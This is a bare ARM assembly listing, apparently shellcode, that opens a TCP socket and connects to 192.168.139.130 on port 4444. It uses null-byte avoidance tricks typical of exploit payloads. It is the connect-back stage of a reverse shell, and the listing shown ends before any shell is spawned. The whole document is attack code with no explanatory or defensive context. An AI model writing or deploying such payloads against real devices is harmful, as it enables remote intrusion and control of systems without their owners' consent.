.global _start
_start:
    mov r0, #2
    mov r1, #1
    mov r2, #0
    mov r7, #200
    add r7, #81
    svc 0
    mov r4, r0
    adr r1, struct
    strb r2, [r1, #1]
    mov r2, #16
    add r7, #2
    svc 0

struct:
    .ascii "\x02\xff"
    .ascii "\x11\x5c"
    .byte 192,168,139,130